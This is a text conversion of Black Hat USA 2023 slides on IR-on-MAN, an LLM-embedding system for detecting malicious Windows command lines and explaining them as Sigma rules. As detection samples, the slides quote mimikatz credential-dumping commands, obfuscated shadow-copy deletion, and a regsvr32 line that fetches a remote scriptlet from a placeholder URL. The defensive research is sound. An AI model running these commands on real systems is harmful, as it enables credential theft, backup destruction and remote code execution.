---
title: "IRonMAN InterpRetable Incident Inspector Based ON Large-Scale Language Model and Association miNing"
speakers: ["Sian-Yao Huang", "Cheng-Lin Yang", "Chung-Kuan Chen"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Sian-Yao Huang & Cheng-Lin Yang & Chung-Kuan Chen_IRonMAN InterpRetable Incident Inspector Based ON Large-Scale Language Model and Association miNing.pdf"
pages: 61
sha256: "e362c0b246e4ec13c0a2a2ff354f189f6931883b3acaecb682f04127788be8e5"
text_chars: 23932
ocr_pages: 8
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:24:19Z"
---
# IRonMAN InterpRetable Incident Inspector Based ON Large-Scale Language Model and Association miNing

**Speakers:** Sian-Yao Huang, Cheng-Lin Yang, Chung-Kuan Chen  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Sian-Yao Huang & Cheng-Lin Yang & Chung-Kuan Chen_IRonMAN InterpRetable Incident Inspector Based ON Large-Scale Language Model and Association miNing.pdf` (61 pages)

## Slide 1

###### IR-on-MAN: InterpRetable Incident Inspector Based ON Large-Scale Language Model and Association miNing

Sian-Yao Huang, Cheng-Lin Yang, Chung-Kuan Chen

#BHUSA @BlackHatEvents

## Slide 2

###### **Outline**

###### Research Motivation Research Problem

Challenge 1: Syntactic Problem Challenge 2: Semantic Problem Challenge 3: Contextual Problem From CmdGPT to IR-ON-MAN Evaluation and Real World Experience Conclusion

#BHUSA @BlackHatEvents

## Slide 3

###### **$whoami**

**Sian-Yao ‘Eric’ Huang** Senior Data Scientist at Publication on top machine learning conferences CVPR IJCNN

Research focuses:

Large-scale multifactorial anomaly detection Automatic AD security analysis Massive user behavior retrieval

**CyCraft | Website**

**CyCraft** | Twitter

#BHUSA @BlackHatEvents

## Slide 4

###### **$whoami**

**Cheng-Lin ‘George’ Yang, PhD (twitter: @clyangtw)** Data Science Director at Research focuses

Distributed large-scale cybersecurity ML analysis platform Adopting large language model to the cybersecurity industry Speakers at the following conference

CyberSec

SECCON

PyCon Taiwan PyCon Japan

Amateur CTF player

**CyCraft | Website**

**CyCraft** | Twitter

#BHUSA @BlackHatEvents

## Slide 5

###### **$whoami**

**Chung-Kuan ‘CK’ Chen, PhD (twitter: @bletchley13)** Security Research Director at Retired CTF Player

Founder of BambooFox CTF Team in NCTU Participate DEFCON Final 2016 and 2018

CHROOT member - best private hacker group in Taiwan Director of Association of Hackers in Taiwan(HIT), Chairman of HITCON Editorial Committee

HITCON CMT 8/18~8/19 HITCON ENT 11/15 HITCON CTF 9/8~9/10

**CyCraft | Website**

**CyCraft** | Twitter

#BHUSA @BlackHatEvents

## Slide 6

###### **Endless Fighting against Threat Actors**

# **台 灣**

###### **TAIWAN**

Taiwan is at the forefront of cyber threats. We have closely monitored numerous cyber attacks, particularly those from China.

#BHUSA @BlackHatEvents

## Slide 7

###### **From Events to Command-lines**

Everyday, we monitored **<u>200M+</u>** events from our visibility

Therefore, automation is indispensable

In this presentation, we focus on process creation event with commandline information

Why command-line à Most complicated with flexible format and rich semantic information

#BHUSA @BlackHatEvents

## Slide 8

**Which command-line can correctly print the computer name?**

- **cmd,/c;hostname**

- **Cmd /c hostname**

- **cmd /c "set x=hostname & echo %x% | cmd"**

- � **Cmd /c"ho"^s^t^"na"m"e**

- **powershell.exe -noP -sta -w 1 -enc aG9zdG5hbWUuZXhl**

#BHUSA @BlackHatEvents

## Slide 9

###### **Challenge 1: Syntactic Problem**

###### Unknown parameter format of customize software

AvDump.exe –pid 588 –-exception_ptr 0 –thread_id 0 –dump_level 1 –-dump_file Q1: C:\windows\temp\1.dmp –-min_interval 0

Command Obfuscation, Fixed parser are susceptible to evasion through slight variations

Q2:

cmd /c wbadmin ^delete catalog -qu^iet cmd /c wmic shadowcopy de^l^e^te^ /noin^terac^tive

#BHUSA @BlackHatEvents

## Slide 10

###### **Challenge 2: Semantic Problem**

The same keywork with different meaning

schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN schtasks /TR "cmd /c date /T > Q3: schtasks.txt "

Different words has the same meaning

Q4:

mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv” mimikatz.exe save HKLM\SAM sam.hiv mirsofts.exe "lsadump::dcsync /domain:qywieoeueirptptitrueuww"

#BHUSA @BlackHatEvents

## Slide 11

###### **Infeasible of Manual Rule Development**

Summarize aforementioned challenges for manual detection rule development Syntactic Problem Semantic Problem Contextual Problem Explanation Issue

#BHUSA @BlackHatEvents

## Slide 12

#### Detecting Malicious Command-line without Rule/RegExp IRONMAN IR-ON-MAN

CyCraft Proprietary and Confidential Information

13

## Slide 13

### **Unleash the AI's Enchanting Magic**

#BHUSA @BlackHatEvents

## Slide 14

###### **The Story Started in Seccon 2023…**

CmdGPT, a command-line specialized embedding model Be able to project command lines into a feature space **from a contextual perspective**

Comparable performance with OpenAI Embedding API **Model Accuracy CmdGPT 82.6 %** OpenAI API 78.2 % Tokens IoU (Tokenized by space) 65.2 % Edit Distance 60.8 %

#BHUSA @BlackHatEvents

## Slide 15

**Investigation in Embedding Space** With CmdGPT, we can query and compare the command lines in vector space directly.

**CMD 1:**

cmd.exe /c rundll32.exe C:\programdata\wwarc64.dll,StartW

**CMD 2:** rundll32.exe C:\Users\left.dll,StartW

#BHUSA @BlackHatEvents

## Slide 16

**Investigation in Embedding Space** With CmdGPT, we can query and compare the command lines in vector space directly. cmd.exe /c rundll32.exe **CMD 1: CmdGPT**

cmd.exe /c rundll32.exe C:\programdata\wwarc64.dll,StartW Embedding Vector

**Similarity: 0.85**

Embedding Vector

**CMD 2:** rundll32.exe C:\Users\left.dll,StartW

**CmdGPT**

#BHUSA @BlackHatEvents

## Slide 17

###### CmdGPT | Knowledge Distillation from Master

Self-Supervised Contrastive Learning
LLM Foundation
InfoNCE Loss
Cmdline 1 CmdGPT
(Student Model)
Cmdline 2
Cmdline 3
Cmdline 4
Supervisor
Cmdline 5
(Teacher Model)
Pseudo Label
Expert’s
Cmdline
(Labeled)
Knowledge
Cmdline
(Labeled)

CyCraft Proprietary and Confidential Information

## Slide 18

###### **Inadequate despite Good Embedding Ability**

###### **Why these command lines are similar?**

#BHUSA @BlackHatEvents

## Slide 19

**Traditional Mining Algorithms** To determine the most significant segment of a command line, **traditional heuristic approaches** typically adhere to two rules:

**Frequency within malicious clusters**

**Rarity within normal clusters**

#BHUSA @BlackHatEvents

## Slide 20

###### **Traditional Mining Algorithms**

###### **Malicious Cluster**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

- "c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

###### **Normal Cluster**

- "c:\windows\system32\cmd.exe" net user"c:\windows\system32\cmd.exe" /c echo ”Hello"

- "c:\windows\system32\cmd.exe" /c echo ”Good afternoon"

A)  echo

B) **mimikatz.exe**

#BHUSA @BlackHatEvents

## Slide 21

###### **Traditional Mining Algorithms**

###### **Malicious Cluster**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

- "c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

###### **Normal Cluster**

- "c:\windows\system32\cmd.exe" net user"c:\windows\system32\cmd.exe" /c echo ”Hello"

- "c:\windows\system32\cmd.exe" /c echo ”Good afternoon"

A)  echo

B) **mimikatz.exe**

Do not follow the rule2 **“Rarity within normal clusters”**

#BHUSA @BlackHatEvents

## Slide 22

###### **Traditional Mining Algorithms**

###### **Malicious Cluster**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

- "c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

###### **Normal Cluster**

- "c:\windows\system32\cmd.exe" net user"c:\windows\system32\cmd.exe" /c echo ”Hello"

- "c:\windows\system32\cmd.exe" /c echo ”Good afternoon"

A) **echo**

B) **mimikatz.exe**

Follow the rule1 and rule2 at the same time! The token **“mimikatz.exe”** is significant token!

#BHUSA @BlackHatEvents

## Slide 23

**Limitations of Traditional Approach** The traditional approach is unable to match the token when the token **undergoes a slight change** .

###### **Malicious Cluster**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

- "c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

#BHUSA @BlackHatEvents

## Slide 24

**Limitations of Traditional Approach** The traditional approach is unable to match the token when the token **undergoes a slight change** .

###### **Malicious Cluster**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\ **ninikatz.exe**

- "c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

#BHUSA @BlackHatEvents

## Slide 25

Can we analyze **from the perspective of context** while providing **intuitive explanations** ?

#BHUSA @BlackHatEvents

## Slide 26

###### **IR-on-MAN**

We propose an interpretable incident inspector, IR-on-MAN. Investigating the incident from context perspective **based on LLM embedding model.** Mining the **significant tokens** directly in the feature space to provide **strong interpretability**

#BHUSA @BlackHatEvents

## Slide 27

###### **IR-on-MAN**

We propose an interpretable incident inspector, IR-on-MAN. Investigating the incident from context perspective **based on LLM embedding model.** Mining the **significant tokens** directly in the feature space to provide **strong interpretability**

bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/xxxxxx/xxxxxx/master/calc.sct scrobj.dll"

IR-on-MAN

#BHUSA @BlackHatEvents

## Slide 28

###### **IR-on-MAN**

We propose an interpretable incident inspector, IR-on-MAN. Investigating the incident from context perspective **based on LLM embedding model.** Mining the **significant tokens** directly in the feature space to provide **strong interpretability**

bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/xxxxxx/xxxxxx/master/calc.sct scrobj.dll"

IR-on-MAN

**bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe** "/u /s /i: **https** ://raw.githubusercontent.com/xxxxxx/xxxxxx/master/ **calc.sct scrobj.dll** "

#BHUSA @BlackHatEvents

## Slide 29

###### IR-on-MAN Inference Phase | AI SOC Assistant

Attack Pattern
(Sigma Rules for SOC)
EDR  APT Campaign
Feature
Mining
CmdGPT
Latent Feature Space
Feature
Mining
Cmdline Logs RedTeam Campaign Attack Pattern
(Sigma Rules for SOC)

CyCraft Proprietary and Confidential Information

## Slide 30

**NO MORE RegExp IR-on-MAN does not employ any exact matching mechanisms throughout the entire IR analysis!!**

#BHUSA @BlackHatEvents

## Slide 31

## Methods

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA &
Methods
#BHUSA @BlackHatEvents
```

## Slide 32

**The Token Impact on Similarity** By removing the segments from the sentences, we found that the **similarity change** can reflect the importance for why there are similar

"c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

###### **Cosine Similarity**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

   - 0.901

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\ **~~mimikatz.exe~~**

   - **0.843 (0.058)**

- "c:\windows\system32\cmd.exe" /c **~~echo~~** %tmp%\mimikatz\x64\mimikatz.exe

   - 0.882 (0.019)

- "c:\windows\ **~~system32~~** ~~\~~ cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

0.876 (0.025)

#BHUSA @BlackHatEvents

## Slide 33

**The Token Impact on Similarity** By removing the segments from the sentences, we found that the **similarity change** can reflect the importance for why there are similar

"c:\windows\system32\windowspowershell\v1.0\powershell.exe" & {$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe if (test-path $mimikatz_path) {exit 0} else {exit 1}}

###### **Cosine Similarity**

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\mimikatz.exe

- "c:\windows\system32\cmd.exe" /c echo %tmp%\mimikatz\x64\ **~~mimikatz.exe~~**

- 0.901 **0.843 (0.058)**

The token **‘mimikatz.exe’** is the most important reason why these two command lines are similar

#BHUSA @BlackHatEvents

## Slide 34

###### **Good Tokenization for Command Line**

Accurately tokenizing command-lines is a challenging task in the realm of cybersecurity

C:\program files (x86)\test.exe,gogo

How to tokenize this command?

#BHUSA @BlackHatEvents

## Slide 35

###### **Good Tokenization for Command Line**

Accurately tokenizing command-lines is a challenging task in the realm of cybersecurity

C:\program files (x86)\test.exe,gogo

How to tokenize this command?

Space:

C:\program files

(x86)\test.exe,gogo

#BHUSA @BlackHatEvents

## Slide 36

###### **Good Tokenization for Command Line**

Accurately tokenizing command-lines is a challenging task in the realm of cybersecurity

C:\program files (x86)\test.exe,gogo

How to tokenize this command?

Space: Regex Pattern:

C:\program files (x86)\test.exe,gogo

Cannot handle all command lines easily

#BHUSA @BlackHatEvents

## Slide 37

###### **Good Tokenization for Command Line**

Accurately tokenizing command-lines is a challenging task in the realm of cybersecurity

C:\program files (x86)\test.exe,gogo

How to tokenize this command?

Space: C:\program files (x86)\test.exe,gogo Regex Pattern: Cannot handle all command lines easily Ideal: C:\ program files (x86)\ test.exe

C:\program files (x86)\test.exe,gogo

C:\ program files (x86)\ test.exe gogo

#BHUSA @BlackHatEvents

## Slide 38

###### **Meaningful Tokenizer**

Meaningful Tokenizer is a cybersecurity domain-specific language model, for command line tokenization. Procedures:

Tokenize approximately 4,000 command lines using cybersecurity domain expertise as training data Fine-tune a language model with a causal objective.

Input Cmdline:

Ideal Tokenizing:

C:\Program Files (x86)\test.exe,gogo

Meaningful
Tokenizer
C:\ Program Files (x86)\ test.exe gogo

#BHUSA @BlackHatEvents

## Slide 39

###### **Significant Tokens Mining** Given a new incident, IR-on-MAN can mine the significant tokens **for each command line**

###### **Query CMD**

./temp/mmkz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit

#BHUSA @BlackHatEvents

## Slide 40

###### **Significant Tokens Mining: Similar History Incidents Query** Given a new CMD, how do we mine the significant token of it?

**Query CMD**

./temp/mmkz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit

CmdGPT

Embedding Vector

###### **Similar History Incidents**

Incident 1 Incident 2 Incident 3

Malicious
CMDs DB

#BHUSA @BlackHatEvents

## Slide 41

###### **Significant Tokens Mining: Inter-Incident Mining** First step, mine the significant for **one specific cluster**

**Query CMD** ./temp/mmkz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit

**Similar Incident 3** (Queried from malicious DB to compare with query cmd)

- cmd.exe /C C:\Windows\temp\mimi.exe sekurlsa::logonPasswords exit 1>C:\Windows\Temp\1.txt > C:\Windows\Temp\jGsDJhyy.tmp 2>&1

- .\mimikatz\x32\mimikatz.exe "privilege::debug” "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" "ts::logonpasswords" "ts::mstsc" exit)

#BHUSA @BlackHatEvents

## Slide 42

**Significant Tokens Mining: Meaningful Tokenization** Tokenize the new cmd into meaningful tokens by meaningful tokenizer. **The Tokens of Query CMD**

./temp/

mmkz.exe

log

sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords

exit

**Similar Incident 3** (Queried from malicious DB to compare with query cmd)

- cmd.exe /C C:\Windows\temp\mimi.exe sekurlsa::logonPasswords exit 1>C:\Windows\Temp\1.txt > C:\Windows\Temp\jGsDJhyy.tmp 2>&1

- .\mimikatz\x32\mimikatz.exe "privilege::debug” "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" "ts::logonpasswords" "ts::mstsc" exit)

#BHUSA @BlackHatEvents

## Slide 43

###### **Significant Tokens Mining: Measure Token Impact Score**

###### Evaluate the impact score for each token **between each cmd in cluster** .

./temp/ mmkz.exe log sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords exit -0.02 +0.01 -0.01 +0.03 +0.01 +0.06 +0.01

**Similar Incident 3** (Queried from malicious DB to compare with query cmd)

- cmd.exe /C C:\Windows\temp\mimi.exe sekurlsa::logonPasswords exit 1>C:\Windows\Temp\1.txt > C:\Windows\Temp\jGsDJhyy.tmp 2>&1

- - .\mimikatz\x32\mimikatz.exe "privilege::debug” "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" "ts::logonpasswords" "ts::mstsc" exit)

#BHUSA @BlackHatEvents

## Slide 44

###### **Significant Tokens Mining: Measure Token Impact Score**

###### Evaluate the impact score for each token **between each cmd in cluster** .

./temp/ mmkz.exe log sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords exit -0.02 +0.01 -0.01 +0.03 +0.01 +0.06 +0.01 -0.01 +0.00 +0.00 +0.01 +0.02 +0.05 +0.00

**Similar Incident 3** (Queried from malicious DB to compare with query cmd)

- cmd.exe /C C:\Windows\temp\mimi.exe sekurlsa::logonPasswords exit 1>C:\Windows\Temp\1.txt > C:\Windows\Temp\jGsDJhyy.tmp 2>&1

- .\mimikatz\x32\mimikatz.exe "privilege::debug” "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" "ts::logonpasswords" "ts::mstsc" exit)

#BHUSA @BlackHatEvents

## Slide 45

###### **Significant Tokens Mining: Threshold Filtering**

A **frequent-based filtering** is applied to get the significant tokens for this cluster

###### **The Tokens of Query CMD**

./temp/ mmkz.exe log sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords exit **+0.0 +0.0** -0.02 +0.01 -0.01 **+0.01** +0.01 **3 6** -0.01 +0.00 +0.00 **+0.01 +0.02 +0.05** +0.00 > threshold

###### **Significant Tokens for Incident 3**

sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords

#BHUSA @BlackHatEvents

## Slide 46

###### **Significant Tokens Mining: Cross-Incident Threshold Filtering** Given a new CMD, how do we mine the significant token of it?

###### **Query CMD**

./temp/mmkz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit **Significant Tokens for each Incident:**

sekurlsa::minidump lsass.dmp sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords temp sekurlsa::logonPasswords mmkz.exe

mmkz.exe

sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords

#BHUSA @BlackHatEvents

## Slide 47

###### **Significant Tokens Mining: Cross-Incident Threshold Filtering** Given a new CMD, how do we mine the significant token of it?

###### **Significant Tokens for each Incident:**

sekurlsa::minidump lsass.dmp sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords temp sekurlsa::logonPasswords mmkz.exe

mmkz.exe

sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords

> threshold

###### **Significant Tokens of new CMD**

sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords

#BHUSA @BlackHatEvents

## Slide 48

## Experiments

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
USA &
Experiments
#BHUSA @BlackHatEvents
```

## Slide 49

###### **Meaningful Tokenizer Performance**

Testing data:

400 command lined tokenized by cybersecurity domain experts It can be ran on commodity Nvidia 3090 GPU

The tokenizing overhead is less than **5%** with about **20%** gain on IoU

Intersection of Union
Space 65.13
Meaningful Tokenizer 84.57
0 10 20 30 40 50 60 70 80 90

#BHUSA @BlackHatEvents

## Slide 50

###### **IR-on-MAN in the Wild**

###### **RECALL = 96.9 %**

###### **PRECISION = 85.6 %**

Out of **7.3 million** command lines, **291** were detected, with only **42** cases being falsely reported.

Out of **36** entities, a total of **257** malicious command lines, with only **8** cases being missed.

We utilize IR-on-MAN to analyze one red-team exercise: The total entity num: 5,008 The total entity with malicious activity: 36 (0.7 %) The ground truth malicious event num: 257 The total event num in the red-team period: 7,311,028

#BHUSA @BlackHatEvents

## Slide 51

###### **Challenge 1: Syntactic Problem**

Q1:

AvDump.exe –pid 588 –-exception_ptr 0 –thread_id 0 –dump_level 1 –-dump_file C:\windows\temp\1.dmp –-min_interval 0 C:/temp/temp/nothing.exe –-exception_ptr 0 -–thread_id 0  –-dump_file C:\normal_file.dmp –pid 51234

A1:

AvDump.exe **–pid** 588 **–-exception_ptr** 0 - **–thread_id** 0 –dump_level 1 **–-dump_file** C:\windows\temp\1.dmp –-min_interval 0 C:/temp/temp/nothing.exe **–-exception_pt** r 0 **-–thread_id** 0 **–-dump_file** C:\normal_file.dmp - **–pid** 51234

Similarity: **0.87**

IR-on-MAN can identify the arguments as significant tokens **for unseen exe file** !

#BHUSA @BlackHatEvents

## Slide 52

###### **Challenge 1: Syntactic Problem**

cmd /c wbadmin ^delete catalog -qu^iet Q1: cmd /c wmic shadowcopy de^l^e^te^ /noin^terac^tive

A1: Similarity: **0.76**

#BHUSA @BlackHatEvents

## Slide 53

###### **Challenge 2: Semantic Problem**

**1**

**2**

schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN schtasks /TR "cmd /c date /T > Q3: schtasks.txt "

**3**

A3: The important score can reflect the difference of the same word:

**1) schtasks (Windows exe file):  0.042** 2) schtasks (Task Name):  0.008

3) schtasks (Filename):  0.013

#BHUSA @BlackHatEvents

## Slide 54

###### **Challenge 2: Semantic Problem**

Q4:

mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv” mimikatz.exe save HKLM\SAM sam.hiv mirsofts.exe "lsadump::dcsync /domain:qywieoeueirptptitrueuww"

A4:

mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv” mimikatz.exe save HKLM\SAM sam.hiv Similarity: 0.547 mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv” mirsofts.exe "lsadump::dcsync /domain:qywieoeueirptptitrueuww" Similarity: **0.896**

#BHUSA @BlackHatEvents

## Slide 55

## Give it a try!

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
USA &
Give it a try!
#BHUSA @BlackHatEvents
```

## Slide 56

##### **Demo site**

###### Try IR-on-MAN via this demo site: https://ironman.cycraft.ai/

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 20253
Demo site
Try IR-on-MAN via this demo site: https://ironman.cycraft.ai/
IN Cc VO, R WN fT rojec out CyCraft @®164 Total Uploaded Files 4 8858 High-risk Commands
YAY
>IR-on-MAN
beta
InterpRetable incident inspector based on
Large-Scale Language Model and Association
miNing
- Black Hat USA 2023 Briefing -
Introducing our Explainable Incident Inspector IR-on-MAN beta: a breakthrough solution
combining language models and contextual comprehension for reliable and
interpretable incident investigation.
```

## Slide 57

##### **Demo site**

###### Significant tokens will be labeled smartly

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 20253
Demo site
Significant tokens will be labeled smartly
y —_ Project About CyCraft @®166 Total Uploaded Files 4 8858 High-risk Commands
CVCRAF 7
InterpRetable incident inspector based on Large-Scale Language Model
IR-on-MAN | and Association mi
Results (520
Severity Time Marked significant tokens
9.0 2623-07-17 263: /PID 4900 /F
2623-07-16 218s C:\WINDOWS\winsxs\amd64_microsoft-windows-servicingstack_31...
2023-07-16 14:14: C:\WINDOWS\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
2023-07-16 SG: C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
2023-07-16 ALE C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
2023-67-16 fe} C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
2623-07-16 7262 C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
2023-87-16 14:36: C:\WINDOWS\system32\wermgr.exe -upload
```

## Slide 58

##### **Demo site**

###### You can export all command lines and their tokens to Sigma rules

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
USA 20253
Demo site
You can export all command lines and their tokens to Sigma rules
InterpRetable incident inspector based on large-scale
>IR-on-MAN
ea | language Model and Association miNing
Explanation
title: Detect significant token
fd1-44ae-8686-ac96d0f9f93a
rimental
utomatically generated by IR-on-MAN
ft Technology Taiwan
date: 2023-08-03T13 :48 :69.758057+00 : 00
detection:
selection_commandline®:
CommandLine|contains|all:
- "4908"
/pid"
- “taskkill'
condition: 1 of selection_commandline*
falsepositives:
- generated by ML model
level: critical
```

## Slide 59

## Takeaways

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
USA &
Takeaways
#BHUSA @BlackHatEvents
```

## Slide 60

###### **Takeaways**

###### Understand the nature of your data

Command lines look like long sentences, but applying popular LLMs on them directly cannot produce acceptable results

Domain knowledge is essential for applying LLM in the specific field

Our results provide a strong evidence that malicious command lines have common tokens

Cybersecurity experts can easily identify possible threat actors via historical token databases

Our demo site provides the Sigma rules functionality

There are still many potentials by using LLM on command lines Command line correlation

Smart search in command lines

#BHUSA @BlackHatEvents

## Slide 61

## Thank You

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
USA &
Thank You
#BHUSA @BlackHatEvents
```
